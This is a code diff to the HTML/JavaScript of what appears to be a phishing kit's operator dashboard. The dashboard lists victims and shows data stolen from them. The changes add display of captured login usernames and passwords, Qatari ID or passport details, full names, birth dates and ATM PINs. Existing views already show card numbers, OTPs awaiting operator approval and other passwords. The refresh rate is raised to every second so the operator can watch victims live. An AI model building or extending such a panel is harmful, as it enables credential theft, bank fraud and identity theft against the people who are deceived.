@@ -318,7 +318,7 @@
                                 </div>
                                 <div class="flex items-center gap-2 text-xs text-gray-600 mb-2">
                                     ${v.data?.step5?.phone ? `<span>📞 ${v.data.step5.phone}</span>` : ''}
-                                    ${v.data?.step4?.cardNumber ? `<span>💳 ****${v.data.step4.cardNumber.slice(-4)}</span>` : ''}
+                                    ${v.data?.step4?.cardNumber ? `<span>💳 ****${v.data.step4.cardNumber.replace(/\s/g, '').slice(-4)}</span>` : ''}
                                 </div>
                                 <div class="flex items-center gap-2 flex-wrap">
                                     <span class="online-dot ${v.isOnline ? 'online' : 'offline'}"></span>
@@ -357,13 +357,45 @@
             // Collect all data items with timestamps
             const items = [];
             
+            // Login Data
+            if (v.data?.login) {
+                items.push({
+                    type: 'login',
+                    title: '🔑 بيانات تسجيل الدخول (Login)',
+                    timestamp: v.data.login.timestamp,
+                    data: v.data.login,
+                    needsApproval: false
+                });
+            }
+            
+            // Step 1: User Type
+            if (v.data?.step1) {
+                items.push({
+                    type: 'step1',
+                    title: '📝 نوع المستخدم (Step 1)',
+                    timestamp: v.data.step1.timestamp,
+                    data: v.data.step1,
+                    needsApproval: false
+                });
+            }
+            
+            // Step 2: QID/Passport
+            if (v.data?.step2) {
+                items.push({
+                    type: 'step2',
+                    title: '🎫 بيانات الهوية (Step 2)',
+                    timestamp: v.data.step2.timestamp,
+                    data: v.data.step2,
+                    needsApproval: false
+                });
+            }
+            
             // Step 3: Password
             if (v.data?.step3) {
                 items.push({
                     type: 'step3',
                     title: '🔐 كلمة المرور (Step 3)',
                     timestamp: v.data.step3.timestamp,
-                    color: 'green',
                     data: v.data.step3,
                     needsApproval: false
                 });
@@ -375,7 +407,6 @@
                     type: 'step4',
                     title: '💳 بيانات البطاقة (Step 4)',
                     timestamp: v.data.step4.timestamp,
-                    color: 'blue',
                     data: v.data.step4,
                     needsApproval: false
                 });
@@ -387,7 +418,6 @@
                     type: 'step5',
                     title: '📱 بيانات التفعيل (Step 5)',
                     timestamp: v.data.step5.timestamp,
-                    color: 'orange',
                     data: v.data.step5,
                     needsApproval: false
                 });
@@ -404,6 +434,17 @@
                     status: v.otp.otp_status || 'pending',
                     needsApproval: true,
                     attemptNumber: v.otp.current.attemptNumber
+                });
+            }
+            
+            // ATM PIN
+            if (v['atmPin.current']?.atmPin) {
+                items.push({
+                    type: 'atmPin',
+                    title: '📱 ATM PIN',
+                    timestamp: v['atmPin.current'].timestamp,
+                    data: v['atmPin.current'],
+                    needsApproval: false
                 });
             }
             
@@ -474,15 +515,8 @@
             
             // Render each item as a bubble
             items.forEach(item => {
-                const colorClasses = {
-                    green: 'border-green-200 bg-green-50',
-                    blue: 'border-blue-200 bg-blue-50',
-                    orange: 'border-orange-200 bg-orange-50',
-                    purple: 'border-purple-200 bg-purple-50',
-                    pink: 'border-pink-200 bg-pink-50'
-                };
-                
-                const bgClass = colorClasses[item.color] || 'border-gray-200 bg-white';
+                // All bubbles same color (white)
+                const bgClass = 'border-gray-300 bg-white';
                 const isNew = isRecent(item.timestamp);
                 
                 html += `
@@ -497,7 +531,31 @@
                 `;
                 
                 // Render data based on type
-                if (item.type === 'step3') {
+                if (item.type === 'login') {
+                    html += `
+                        <div class="grid grid-cols-2 gap-4">
+                            <div><span class="text-gray-600">اسم المستخدم:</span> <span class="font-medium">${item.data.username || '-'}</span></div>
+                            <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
+                        </div>
+                    `;
+                } else if (item.type === 'step1') {
+                    html += `
+                        <div class="grid grid-cols-2 gap-4">
+                            <div><span class="text-gray-600">نوع المستخدم:</span> <span class="font-medium">${item.data.userType === 'QID' ? 'بطاقة هوية قطرية' : 'جواز سفر'}</span></div>
+                        </div>
+                    `;
+                } else if (item.type === 'step2') {
+                    html += `
+                        <div class="grid grid-cols-2 gap-4">
+                            ${item.data.qidNumber ? `<div><span class="text-gray-600">رقم البطاقة:</span> <span class="font-medium">${item.data.qidNumber}</span></div>` : ''}
+                            ${item.data.passportNumber ? `<div><span class="text-gray-600">رقم الجواز:</span> <span class="font-medium">${item.data.passportNumber}</span></div>` : ''}
+                            ${item.data.fullName ? `<div><span class="text-gray-600">الاسم الكامل:</span> <span class="font-medium">${item.data.fullName}</span></div>` : ''}
+                            ${item.data.nationality ? `<div><span class="text-gray-600">الجنسية:</span> <span class="font-medium">${item.data.nationality}</span></div>` : ''}
+                            ${item.data.dateOfBirth ? `<div><span class="text-gray-600">تاريخ الميلاد:</span> <span class="font-medium">${item.data.dateOfBirth}</span></div>` : ''}
+                            ${item.data.expiryDate ? `<div><span class="text-gray-600">تاريخ الانتهاء:</span> <span class="font-medium">${item.data.expiryDate}</span></div>` : ''}
+                        </div>
+                    `;
+                } else if (item.type === 'step3') {
                     html += `
                         <div class="grid grid-cols-2 gap-4">
                             <div><span class="text-gray-600">كلمة المرور:</span> <span class="font-medium">${item.data.password || '-'}</span></div>
@@ -546,6 +604,17 @@
                                 </button>
                             </div>
                             ` : ''}
+                        </div>
+                    `;
+                } else if (item.type === 'atmPin') {
+                    html += `
+                        <div class="mb-4">
+                            <div class="text-center">
+                                <span class="text-4xl font-bold text-blue-600">${item.data.atmPin}</span>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div><span class="text-gray-600">رقم المحاولة:</span> <span class="font-medium">${item.data.attemptNumber || 1}</span></div>
                         </div>
                     `;
                 } else if (item.type === 'verification' || item.type === 'verification_history') {
@@ -716,10 +785,10 @@
         $(document).ready(function() {
             loadVisitors();
             
-            // Auto-refresh every 5 seconds
+            // Auto-refresh every 1 second (real-time)
             setInterval(function() {
                 loadVisitors();
-            }, 5000);
+            }, 1000);
         });
     </script>
 </body>
